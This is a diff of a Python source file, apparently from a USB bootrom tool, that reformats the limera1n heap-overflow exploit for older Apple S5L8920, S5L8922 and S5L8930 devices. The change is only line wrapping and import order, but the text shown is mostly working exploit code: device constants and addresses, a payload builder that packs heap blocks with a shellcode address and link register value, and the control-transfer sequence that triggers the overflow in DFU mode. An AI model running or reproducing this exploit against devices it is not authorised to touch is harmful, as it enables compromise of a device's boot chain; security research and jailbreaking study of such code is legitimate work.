@@ -1,15 +1,16 @@
 # Credit: This file is based on limera1n exploit (heap overflow) by geohot.
 
-import array
 import ctypes
 import struct
 import sys
 import time
 
+import array
+
 import dfu
 import usb  # pyusb: use 'pip install pyusb' to install this module
 
-# Must be global so garbage collector never frees it 
+# Must be global so garbage collector never frees it
 request = None
 transfer_ptr = None
 
@@ -124,10 +125,34 @@ class DeviceConfig:
 
 
 configs = [
-    DeviceConfig('359.3', '8920', 0x84033FA4, 0x24000, constants_359_3),  # S5L8920 (old bootrom)
-    DeviceConfig('359.3.2', '8920', 0x84033FA4, 0x24000, constants_359_3_2),  # S5L8920 (new bootrom)
-    DeviceConfig('359.5', '8922', 0x84033F98, 0x24000, constants_359_5),  # S5L8922
-    DeviceConfig('574.4', '8930', 0x8403BF9C, 0x2C000, constants_574_4),  # S5L8930
+    DeviceConfig(
+        '359.3',
+        '8920',
+        0x84033FA4,
+        0x24000,
+        constants_359_3),
+    # S5L8920 (old bootrom)
+    DeviceConfig(
+        '359.3.2',
+        '8920',
+        0x84033FA4,
+        0x24000,
+        constants_359_3_2),
+    # S5L8920 (new bootrom)
+    DeviceConfig(
+        '359.5',
+        '8922',
+        0x84033F98,
+        0x24000,
+        constants_359_5),
+    # S5L8922
+    DeviceConfig(
+        '574.4',
+        '8930',
+        0x8403BF9C,
+        0x2C000,
+        constants_574_4),
+    # S5L8930
 ]
 
 
@@ -149,19 +174,36 @@ def create_control_transfer(device, request, timeout):
     return ptr
 
 
-def limera1n_libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
+def limera1n_libusb1_async_ctrl_transfer(
+        device,
+        bmRequestType,
+        bRequest,
+        wValue,
+        wIndex,
+        data,
+        timeout):
     if usb.backend.libusb1._lib is not device._ctx.backend.lib:
         print('ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.')
         sys.exit(1)
 
-    request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
+    request = array.array(
+        'B',
+        struct.pack(
+            '<BBHHH',
+            bmRequestType,
+            bRequest,
+            wValue,
+            wIndex,
+            len(data)) +
+        data)
     transfer_ptr = create_control_transfer(device, request, timeout)
     assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0
 
     time.sleep(timeout / 1000.0)
 
     # Prototype of libusb_cancel_transfer is missing from pyusb
-    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
+    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [
+        ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
     assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0
 
 
@@ -169,7 +211,8 @@ def generate_payload(constants, exploit_lr):
     with open('bin/limera1n-shellcode.bin', 'rb') as f:
         shellcode = f.read()
 
-    # Shellcode has placeholder values for constants; check they match and replace with constants from config
+    # Shellcode has placeholder values for constants; check they match and
+    # replace with constants from config
     placeholders_offset = len(shellcode) - 4 * len(constants)
     for i in range(len(constants)):
         offset = placeholders_offset + 4 * i
@@ -177,8 +220,15 @@ def generate_payload(constants, exploit_lr):
         assert value == 0xBAD00001 + i
 
     shellcode_address = 0x84000400 + 1
-    heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, '\xCC' * 48)
-    return heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
+    heap_block = struct.pack(
+        '<4I48s',
+        0x405,
+        0x101,
+        shellcode_address,
+        exploit_lr,
+        '\xCC' * 48)
+    return heap_block * 16 + \
+        shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
 
 
 def exploit():
@@ -199,17 +249,24 @@ def exploit():
     if chosenConfig is None:
         for config in configs:
             if 'CPID:%s' % config.cpid in device.serial_number:
-                print('ERROR: CPID is compatible, but serial number string does not match.')
-                print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
+                print(
+                    'ERROR: CPID is compatible, but serial number string does not match.')
+                print(
+                    'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
                 sys.exit(1)
         print('ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.')
         sys.exit(1)
 
-    dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))
+    dfu.send_data(
+        device,
+        generate_payload(
+            chosenConfig.constants,
+            chosenConfig.exploit_lr))
 
     assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1
 
-    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 10)
+    limera1n_libusb1_async_ctrl_transfer(
+        device, 0x21, 1, 0, 0, 'A' * 0x800, 10)
 
     try:
         device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
